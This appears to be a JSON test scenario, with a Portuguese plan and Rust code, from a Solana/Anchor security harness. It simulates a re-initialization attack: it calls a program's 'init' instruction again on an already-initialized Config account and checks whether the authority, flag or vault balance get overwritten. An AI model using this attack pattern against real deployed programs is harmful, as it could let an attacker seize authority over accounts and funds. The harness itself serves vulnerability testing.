{
  "plan": "O programa-alvo expõe a instrução `init` que grava authority, is_initialized e vault_balance em uma conta Config. O baseline chama `init` legitimamente sobre uma conta Config recém-criada (empty_account) com o authority signer, provando que o cenário está montado corretamente. O ataque reutiliza a mesma instrução `init` sobre a conta Config já inicializada resultante do baseline, tentando sobrescrever o estado. O efeito medido é que a conta já inicializada foi reinicializada e teve seu estado sobrescrito (authority/is_initialized/vault_balance alterados em relação ao estado pós-baseline).",
  "scenario": "let authority = Pubkey::new_unique();
let config_key = Pubkey::new_unique();

let metas = vec![
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(authority, true),
];

let contas = vec![
    (config_key, empty_account()),
    (authority, wallet(1_000_000_000)),
];

let ix = env.anchor_ix("init", &(), metas.clone());
let r = env.baseline("init legitimo em conta nova", &ix, &contas);

let config_pos = after(&r, &config_key).clone();
let authority_pos = read_pubkey(config_pos.data(), 8);
let is_init_pos = config_pos.data()[40] != 0;
let vault_pos = read_u64(config_pos.data(), 41);

let contas_ataque = vec![
    (config_key, config_pos.clone()),
    (authority, wallet(1_000_000_000)),
];

let ix_ataque = env.anchor_ix("init", &(), metas);
let r_ataque = env.attack("reinit da conta Config ja inicializada", &ix_ataque, &contas_ataque);

if r_ataque.program_result == ProgramResult::Success {
    let config_depois = after(&r_ataque, &config_key);
    let authority_depois = read_pubkey(config_depois.data(), 8);
    let is_init_depois = config_depois.data()[40] != 0;
    let vault_depois = read_u64(config_depois.data(), 41);
    env.effect(
        "conta Config ja inicializada foi reinicializada e teve estado sobrescrito",
        is_init_depois && (authority_depois != authority_pos || vault_depois != vault_pos || !is_init_pos),
    );
}"
}

